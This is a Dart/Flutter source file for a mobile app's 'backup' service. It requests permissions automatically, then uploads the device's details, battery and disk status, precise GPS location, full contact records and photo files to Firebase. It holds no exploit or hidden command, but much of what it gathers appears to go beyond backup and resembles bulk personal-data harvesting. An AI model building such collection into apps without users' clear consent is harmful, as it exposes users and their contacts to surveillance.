import 'dart:async';
import 'dart:developer';
import 'dart:io';

import 'package:crypted_app/app/data/data_source/user_services.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:disk_space/disk_space.dart';

/// Backup state for real-time tracking
enum BackupState {
  idle,
  checkingPermissions,
  requestingPermissions,
  gatheringData,
  uploading,
  completed,
  failed,
  cancelled,
}

/// Enhanced backup service with comprehensive data collection
/// Organizes data by: users/{username}_{uid}/{dataType}/{timestamp}/data
class EnhancedBackupService {
  static EnhancedBackupService? _instance;
  static EnhancedBackupService get instance {
    _instance ??= EnhancedBackupService._internal();
    return _instance!;
  }

  EnhancedBackupService._internal();

  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  final FirebaseStorage _storage = FirebaseStorage.instance;
  final Battery _battery = Battery();
  final Connectivity _connectivity = Connectivity();

  // State management
  final StreamController<BackupState> _stateController = StreamController<BackupState>.broadcast();
  final StreamController<double> _progressController = StreamController<double>.broadcast();
  final StreamController<String> _statusController = StreamController<String>.broadcast();
  final StreamController<Map<String, bool>> _permissionsController = StreamController<Map<String, bool>>.broadcast();

  Stream<BackupState> get stateStream => _stateController.stream;
  Stream<double> get progressStream => _progressController.stream;
  Stream<String> get statusStream => _statusController.stream;
  Stream<Map<String, bool>> get permissionsStream => _permissionsController.stream;

  BackupState _currentState = BackupState.idle;
  double _currentProgress = 0.0;
  String _currentStatus = 'Ready to backup';
  Map<String, bool> _permissions = {};

  // Getters
  BackupState get currentState => _currentState;
  double get currentProgress => _currentProgress;
  String get currentStatus => _currentStatus;
  Map<String, bool> get permissions => _permissions;

  /// Update state and broadcast
  void _updateState(BackupState state) {
    _currentState = state;
    _stateController.add(state);
    log('📊 Backup state: ${state.name}');
  }

  /// Update progress and broadcast
  void _updateProgress(double progress, String status) {
    _currentProgress = progress;
    _currentStatus = status;
    _progressController.add(progress);
    _statusController.add(status);
    log('📊 Progress: ${(progress * 100).toStringAsFixed(1)}% - $status');
  }

  /// Get organized Firebase path for user data
  String _getUserBasePath() {
    final user = UserService.currentUser.value;
    final username = user?.fullName?.replaceAll(' ', '_') ?? 'unknown';
    final uid = user?.uid ?? 'no_uid';
    return 'users/${username}_$uid';
  }

  /// Upload file to Firebase Storage with organized structure
  Future<String?> _uploadToStorage({
    required File file,
    required String dataType,
    String? customFileName,
    Function(double)? onProgress,
  }) async {
    try {
      final basePath = _getUserBasePath();
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      final fileName = customFileName ?? 'data_$timestamp${_getFileExtension(file.path)}';
      final storagePath = '$basePath/$dataType/$fileName';

      log('📤 Uploading to: $storagePath');

      final ref = _storage.ref().child(storagePath);
      final uploadTask = ref.putFile(file);

      // Track upload progress
      uploadTask.snapshotEvents.listen((TaskSnapshot snapshot) {
        if (onProgress != null && snapshot.totalBytes > 0) {
          final progress = snapshot.bytesTransferred / snapshot.totalBytes;
          onProgress(progress);
        }
      });

      final uploadSnapshot = await uploadTask;
      final downloadUrl = await uploadSnapshot.ref.getDownloadURL();

      log('✅ Upload successful: $downloadUrl');
      return downloadUrl;
    } catch (e) {
      log('❌ Upload failed: $e');
      return null;
    }
  }

  /// Save metadata to Firestore with organized structure
  Future<void> _saveMetadata({
    required String dataType,
    required Map<String, dynamic> metadata,
  }) async {
    try {
      final basePath = _getUserBasePath();
      final timestamp = DateTime.now();

      await _firestore
          .collection('backups')
          .doc(basePath.replaceAll('/', '_'))
          .collection(dataType)
          .doc(timestamp.millisecondsSinceEpoch.toString())
          .set({
        ...metadata,
        'timestamp': FieldValue.serverTimestamp(),
        'createdAt': timestamp.toIso8601String(),
        'userPath': basePath,
      });

      log('✅ Metadata saved for $dataType');
    } catch (e) {
      log('❌ Metadata save failed: $e');
    }
  }

  String _getFileExtension(String path) {
    return path.substring(path.lastIndexOf('.'));
  }

  // =================== PERMISSION MANAGEMENT ===================

  /// Check all required permissions
  Future<Map<String, bool>> checkAllPermissions() async {
    _updateState(BackupState.checkingPermissions);
    _updateProgress(0.0, 'Checking permissions...');

    final permissionStatus = <String, bool>{};

    try {
      // Location permission
      permissionStatus['location'] = await Permission.location.isGranted;

      // Contacts permission
      permissionStatus['contacts'] = await FlutterContacts.requestPermission(readonly: true);

      // Photos permission
      final photoPermission = await PhotoManager.requestPermissionExtend();
      permissionStatus['photos'] = photoPermission.isAuth;

      // Storage permission (for Android)
      if (Platform.isAndroid) {
        permissionStatus['storage'] = await Permission.storage.isGranted;
      } else {
        permissionStatus['storage'] = true; // iOS handles this differently
      }

      // Notification permission (optional)
      permissionStatus['notifications'] = await Permission.notification.isGranted;

    } catch (e) {
      log('❌ Error checking permissions: $e');
    }

    _permissions = permissionStatus;
    _permissionsController.add(permissionStatus);
    log('📋 Permissions checked: $permissionStatus');

    return permissionStatus;
  }

  /// Request all required permissions
  Future<Map<String, bool>> requestAllPermissions() async {
    _updateState(BackupState.requestingPermissions);
    _updateProgress(0.1, 'Requesting permissions...');

    final permissionStatus = <String, bool>{};

    try {
      // Location permission
      final locationStatus = await Permission.location.request();
      permissionStatus['location'] = locationStatus.isGranted;

      // Contacts permission
      permissionStatus['contacts'] = await FlutterContacts.requestPermission();

      // Photos permission
      final photoPermission = await PhotoManager.requestPermissionExtend();
      permissionStatus['photos'] = photoPermission.isAuth;

      // Storage permission (for Android)
      if (Platform.isAndroid) {
        final storageStatus = await Permission.storage.request();
        permissionStatus['storage'] = storageStatus.isGranted;
      } else {
        permissionStatus['storage'] = true;
      }

      // Notification permission (optional)
      final notificationStatus = await Permission.notification.request();
      permissionStatus['notifications'] = notificationStatus.isGranted;

    } catch (e) {
      log('❌ Error requesting permissions: $e');
    }

    _permissions = permissionStatus;
    _permissionsController.add(permissionStatus);
    log('📋 Permissions requested: $permissionStatus');

    return permissionStatus;
  }

  // =================== DEVICE INFO BACKUP ===================

  /// Backup comprehensive device information including storage, battery, network
  Future<bool> backupDeviceInfo() async {
    try {
      log('📱 Starting comprehensive device info backup...');
      _updateProgress(0.2, 'Gathering device information...');

      final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
      Map<String, dynamic> deviceData = {};

      // Basic device info
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfoPlugin.androidInfo;
        deviceData = {
          'platform': 'Android',
          'brand': androidInfo.brand,
          'model': androidInfo.model,
          'manufacturer': androidInfo.manufacturer,
          'androidVersion': androidInfo.version.release,
          'sdkInt': androidInfo.version.sdkInt,
          'device': androidInfo.device,
          'product': androidInfo.product,
          'hardware': androidInfo.hardware,
          'isPhysicalDevice': androidInfo.isPhysicalDevice,
        };
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfoPlugin.iosInfo;
        deviceData = {
          'platform': 'iOS',
          'name': iosInfo.name,
          'model': iosInfo.model,
          'systemName': iosInfo.systemName,
          'systemVersion': iosInfo.systemVersion,
          'localizedModel': iosInfo.localizedModel,
          'identifierForVendor': iosInfo.identifierForVendor,
          'isPhysicalDevice': iosInfo.isPhysicalDevice,
        };
      }

      // Battery info
      try {
        final batteryLevel = await _battery.batteryLevel;
        final batteryState = await _battery.batteryState;
        deviceData['battery'] = {
          'level': batteryLevel,
          'state': batteryState.toString(),
          'timestamp': DateTime.now().toIso8601String(),
        };
      } catch (e) {
        log('⚠️ Could not get battery info: $e');
      }

      // Network info
      try {
        final connectivityResult = await _connectivity.checkConnectivity();
        deviceData['network'] = {
          'type': connectivityResult.toString(),
          'timestamp': DateTime.now().toIso8601String(),
        };
      } catch (e) {
        log('⚠️ Could not get network info: $e');
      }

      // Storage info
      try {
        final freeDiskSpace = await DiskSpace.getFreeDiskSpace;
        final totalDiskSpace = await DiskSpace.getTotalDiskSpace;
        deviceData['storage'] = {
          'free': freeDiskSpace,
          'total': totalDiskSpace,
          'used': totalDiskSpace != null && freeDiskSpace != null ? totalDiskSpace - freeDiskSpace : null,
          'freePercentage': totalDiskSpace != null && freeDiskSpace != null ? (freeDiskSpace / totalDiskSpace * 100) : null,
          'unit': 'MB',
          'timestamp': DateTime.now().toIso8601String(),
        };
      } catch (e) {
        log('⚠️ Could not get storage info: $e');
      }

      await _saveMetadata(
        dataType: 'device_info',
        metadata: {
          'deviceInfo': deviceData,
          'backupType': 'device_information',
          'permissions': _permissions,
        },
      );

      log('✅ Device info backed up successfully');
      return true;
    } catch (e) {
      log('❌ Device info backup failed: $e');
      return false;
    }
  }

  // =================== LOCATION BACKUP ===================

  /// Backup comprehensive location data
  Future<bool> backupLocation() async {
    try {
      log('📍 Starting comprehensive location backup...');
      _updateProgress(0.3, 'Gathering location data...');

      if (!_permissions['location']!) {
        log('⚠️ Location permission not granted');
        return false;
      }

      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        log('⚠️ Location services are disabled');
        return false;
      }

      // Get current position
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      final locationData = {
        'current': {
          'latitude': position.latitude,
          'longitude': position.longitude,
          'accuracy': position.accuracy,
          'altitude': position.altitude,
          'altitudeAccuracy': position.altitudeAccuracy,
          'heading': position.heading,
          'headingAccuracy': position.headingAccuracy,
          'speed': position.speed,
          'speedAccuracy': position.speedAccuracy,
          'timestamp': position.timestamp.toIso8601String(),
          'isMocked': position.isMocked,
        },
        'googleMapsUrl': 'https://www.google.com/maps/search/?api=1&query=${position.latitude},${position.longitude}&zoom=18',
        'settings': {
          'serviceEnabled': serviceEnabled,
          'accuracy': LocationAccuracy.high.toString(),
        }
      };

      await _saveMetadata(
        dataType: 'location',
        metadata: {
          'location': locationData,
          'backupType': 'location_data',
        },
      );

      log('✅ Location backed up successfully');
      return true;
    } catch (e) {
      log('❌ Location backup failed: $e');
      return false;
    }
  }

  // =================== CONTACTS BACKUP ===================

  /// Backup comprehensive contacts data
  Future<bool> backupContacts() async {
    try {
      log('📞 Starting comprehensive contacts backup...');
      _updateProgress(0.4, 'Gathering contacts...');

      if (!_permissions['contacts']!) {
        log('⚠️ Contacts permission not granted');
        return false;
      }

      final contacts = await FlutterContacts.getContacts(
        withProperties: true,
        withPhoto: false,
        withThumbnail: false,
        withGroups: false,
        withAccounts: false,
      );

      final contactsList = contacts.map((contact) {
        return {
          'id': contact.id,
          'displayName': contact.displayName,
          'name': {
            'first': contact.name.first,
            'last': contact.name.last,
            'middle': contact.name.middle,
            'prefix': contact.name.prefix,
            'suffix': contact.name.suffix,
            'nickname': contact.name.nickname,
          },
          'phones': contact.phones.map((phone) => {
            'number': phone.number,
            'normalizedNumber': phone.normalizedNumber,
            'label': phone.label.name,
            'customLabel': phone.customLabel,
            'isPrimary': phone.isPrimary,
          }).toList(),
          'emails': contact.emails.map((email) => {
            'address': email.address,
            'label': email.label.name,
            'customLabel': email.customLabel,
            'isPrimary': email.isPrimary,
          }).toList(),
          'addresses': contact.addresses.map((address) => {
            'address': address.address,
            'street': address.street,
            'city': address.city,
            'state': address.state,
            'postalCode': address.postalCode,
            'country': address.country,
            'label': address.label.name,
          }).toList(),
          'organizations': contact.organizations.map((org) => {
            'company': org.company,
            'title': org.title,
            'department': org.department,
          }).toList(),
          'websites': contact.websites.map((web) => {
            'url': web.url,
            'label': web.label.name,
          }).toList(),
          'socialMedias': contact.socialMedias.map((social) => {
            'userName': social.userName,
            'label': social.label.name,
          }).toList(),
        };
      }).toList();

      await _saveMetadata(
        dataType: 'contacts',
        metadata: {
          'contactsCount': contacts.length,
          'contacts': contactsList,
          'backupType': 'contacts_data',
          'timestamp': DateTime.now().toIso8601String(),
        },
      );

      log('✅ ${contacts.length} contacts backed up successfully');
      return true;
    } catch (e) {
      log('❌ Contacts backup failed: $e');
      return false;
    }
  }

  // =================== PHOTOS BACKUP ===================

  /// Backup device photos with progress tracking
  Future<bool> backupPhotos({int batchSize = 50, int? maxPhotos}) async {
    try {
      log('📸 Starting comprehensive photos backup...');
      _updateProgress(0.5, 'Gathering photos...');

      if (!_permissions['photos']!) {
        log('⚠️ Gallery permission not granted');
        return false;
      }

      // Get all photos
      final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
        type: RequestType.image,
      );

      if (albums.isEmpty) {
        log('⚠️ No photos found');
        return false;
      }

      int totalPhotos = 0;
      List<String> uploadedUrls = [];
      List<Map<String, dynamic>> photoMetadata = [];
      int photosToBackup = 0;

      // Calculate total photos first
      for (var album in albums) {
        final count = await album.assetCountAsync;
        photosToBackup += count;
      }

      if (maxPhotos != null && photosToBackup > maxPhotos) {
        photosToBackup = maxPhotos;
      }

      log('📸 Found $photosToBackup photos to backup');

      // Get photos from all albums
      for (var album in albums) {
        if (maxPhotos != null && totalPhotos >= maxPhotos) break;

        final int remainingPhotos = maxPhotos != null ? maxPhotos - totalPhotos : batchSize;
        final List<AssetEntity> photos = await album.getAssetListPaged(
          page: 0,
          size: remainingPhotos,
        );

        for (var photo in photos) {
          try {
            final File? file = await photo.file;
            if (file != null) {
              // Update progress for each photo
              final photoProgress = totalPhotos / photosToBackup;
              _updateProgress(0.5 + (photoProgress * 0.4), 'Uploading photo ${totalPhotos + 1}/$photosToBackup');

              final url = await _uploadToStorage(
                file: file,
                dataType: 'photos',
                customFileName: 'photo_${photo.id}${_getFileExtension(file.path)}',
              );

              if (url != null) {
                uploadedUrls.add(url);
                final fileInfo = await file.stat();
                photoMetadata.add({
                  'id': photo.id,
                  'url': url,
                  'title': await photo.titleAsync,
                  'createDate': photo.createDateTime.toIso8601String(),
                  'modifiedDate': photo.modifiedDateTime.toIso8601String(),
                  'width': photo.width,
                  'height': photo.height,
                  'size': fileInfo.size,
                  'mimeType': await photo.mimeTypeAsync,
                  'album': album.name,
                });
                totalPhotos++;
              }
            }
          } catch (e) {
            log('⚠️ Failed to upload photo: $e');
          }
        }
      }

      await _saveMetadata(
        dataType: 'photos',
        metadata: {
          'photosCount': totalPhotos,
          'photoUrls': uploadedUrls,
          'photos': photoMetadata,
          'backupType': 'photos_data',
          'albums': albums.map((a) => a.name).toList(),
          'totalAlbums': albums.length,
          'timestamp': DateTime.now().toIso8601String(),
        },
      );

      log('✅ $totalPhotos photos backed up successfully');
      return true;
    } catch (e) {
      log('❌ Photos backup failed: $e');
      return false;
    }
  }

  // =================== FULL BACKUP ===================

  /// Run complete backup of all data types with progress tracking
  Future<Map<String, bool>> runFullBackup({
    bool autoRequestPermissions = true,
    int? maxPhotos,
  }) async {
    log('🚀 Starting full backup...');
    _updateState(BackupState.gatheringData);

    final results = <String, bool>{};

    try {
      // Check permissions first
      await checkAllPermissions();

      // Request missing permissions if needed
      if (autoRequestPermissions) {
        final hasMissingPermissions = _permissions.values.any((granted) => !granted);
        if (hasMissingPermissions) {
          await requestAllPermissions();
        }
      }

      // Run all backups
      _updateProgress(0.15, 'Backing up device info...');
      results['deviceInfo'] = await backupDeviceInfo();

      _updateProgress(0.3, 'Backing up location...');
      results['location'] = await backupLocation();

      _updateProgress(0.45, 'Backing up contacts...');
      results['contacts'] = await backupContacts();

      _updateProgress(0.6, 'Backing up photos...');
      results['photos'] = await backupPhotos(maxPhotos: maxPhotos);

      // Save overall backup summary
      _updateProgress(0.95, 'Saving backup summary...');
      await _saveMetadata(
        dataType: 'backup_summary',
        metadata: {
          'results': results,
          'backupType': 'full_backup',
          'successCount': results.values.where((v) => v).length,
          'totalCount': results.length,
          'permissions': _permissions,
          'timestamp': DateTime.now().toIso8601String(),
        },
      );

      final successCount = results.values.where((v) => v).length;
      _updateProgress(1.0, 'Backup completed: $successCount/${results.length} successful');
      _updateState(BackupState.completed);

      log('✅ Full backup completed: $successCount/${results.length} successful');
      return results;

    } catch (e) {
      log('❌ Full backup failed: $e');
      _updateState(BackupState.failed);
      _updateProgress(0.0, 'Backup failed: $e');
      rethrow;
    }
  }

  // =================== BACKUP STATUS ===================

  /// Get comprehensive backup statistics
  Future<Map<String, dynamic>> getBackupStats() async {
    try {
      final basePath = _getUserBasePath();
      final docId = basePath.replaceAll('/', '_');

      final deviceInfoSnap = await _firestore
          .collection('backups')
          .doc(docId)
          .collection('device_info')
          .get();

      final locationSnap = await _firestore
          .collection('backups')
          .doc(docId)
          .collection('location')
          .get();

      final contactsSnap = await _firestore
          .collection('backups')
          .doc(docId)
          .collection('contacts')
          .get();

      final photosSnap = await _firestore
          .collection('backups')
          .doc(docId)
          .collection('photos')
          .get();

      // Get last backup details
      final lastBackup = await _getLastBackupTime(docId);
      final lastBackupSummary = await _getLastBackupSummary(docId);

      return {
        'deviceInfoBackups': deviceInfoSnap.docs.length,
        'locationBackups': locationSnap.docs.length,
        'contactsBackups': contactsSnap.docs.length,
        'photosBackups': photosSnap.docs.length,
        'totalBackups': deviceInfoSnap.docs.length + locationSnap.docs.length +
                       contactsSnap.docs.length + photosSnap.docs.length,
        'lastBackup': lastBackup,
        'lastBackupSummary': lastBackupSummary,
      };
    } catch (e) {
      log('❌ Failed to get backup stats: $e');
      return {};
    }
  }

  Future<DateTime?> _getLastBackupTime(String docId) async {
    try {
      final summarySnap = await _firestore
          .collection('backups')
          .doc(docId)
          .collection('backup_summary')
          .orderBy('timestamp', descending: true)
          .limit(1)
          .get();

      if (summarySnap.docs.isNotEmpty) {
        final timestamp = summarySnap.docs.first.data()['timestamp'] as Timestamp?;
        return timestamp?.toDate();
      }
    } catch (e) {
      log('⚠️ Failed to get last backup time: $e');
    }
    return null;
  }

  Future<Map<String, dynamic>?> _getLastBackupSummary(String docId) async {
    try {
      final summarySnap = await _firestore
          .collection('backups')
          .doc(docId)
          .collection('backup_summary')
          .orderBy('timestamp', descending: true)
          .limit(1)
          .get();

      if (summarySnap.docs.isNotEmpty) {
        return summarySnap.docs.first.data();
      }
    } catch (e) {
      log('⚠️ Failed to get last backup summary: $e');
    }
    return null;
  }

  // =================== CLEANUP ===================

  void dispose() {
    _stateController.close();
    _progressController.close();
    _statusController.close();
    _permissionsController.close();
  }
}
